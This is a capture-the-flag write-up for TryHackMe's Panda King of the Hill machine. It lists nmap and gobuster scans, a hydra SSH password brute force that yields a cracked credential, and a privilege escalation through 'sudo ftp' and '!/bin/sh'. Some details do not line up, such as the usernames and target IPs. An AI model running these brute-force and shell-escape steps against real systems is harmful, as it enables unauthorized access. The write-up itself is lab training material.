# TryHackMe Panda King Of The Hill Writeup

<img width="1133" height="634" alt="image" src="https://github.com/user-attachments/assets/bf4c2c9f-1fb9-477b-a3ae-e8f4ff0550eb" />

---

## Nmap Scan

```
nmap -sCV -Pn MACHINE_IP
```

```ruby
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain      ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
1337/tcp open  http        nginx 1.16.1
|_http-title: Register Today
3306/tcp open  mysql       MariaDB (unauthorized)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.92
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 15 Mar 2026 20:11:55 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

---

## Gobuster 

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://10.128.129.254
```

```
+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/cgi-bin/             (Status: 403) [Size: 210]
/flag                 (Status: 301) [Size: 234] [--> http://10.10.237.240/flag/]
/index.html           (Status: 200) [Size: 230]
/robots.txt           (Status: 200) [Size: 10]
/wordpress            (Status: 301) [Size: 239] [--> http://10.10.237.240/wordpress/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<details>
  <summary>First way to get into system</summary>

## open website 

```
http://10.128.129.254
```

> ## in source code found username call **`sheffo`**

## brute force the password using hydra

```
hydra -l sheffo -P /usr/share/wordlists/rockyou.txt ssh://10.10.24.15
```

```
shifoo : batman
```

  
</details>

---
---
---
---

<details>
  <summary>Firts way to PrivEsc</summary>

```
sudo -l
```

> ## found **`Ftp`**

```
sudo ftp
!/bin/sh
```

  
</details>

